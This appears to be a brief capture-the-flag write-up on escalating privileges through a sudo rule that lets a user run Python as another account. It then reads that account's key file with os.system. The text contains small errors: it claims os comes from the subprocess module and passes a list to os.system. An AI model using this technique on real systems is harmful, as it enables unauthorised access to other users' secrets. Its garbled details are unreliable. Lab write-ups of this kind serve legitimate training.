**GOAL**: To retrieve the key using privileges escalation based on misconfigurations of the sudo command.

## Solution:
1. Logging into the instance, we look at what we can run using sudo.
2. We see that we can run `python` with sudo privilege
3. To solve this challenge, you will need to use the python command `sudo -u victim python` From that you should be able to:

- import the os command from the subprocess module:
```python
import os
```
- run commands:
```python
os.system(['uname'])
```
4. We need to enter the command:
```python
import os 
os.system('cat /home/victim/key.txt')
```
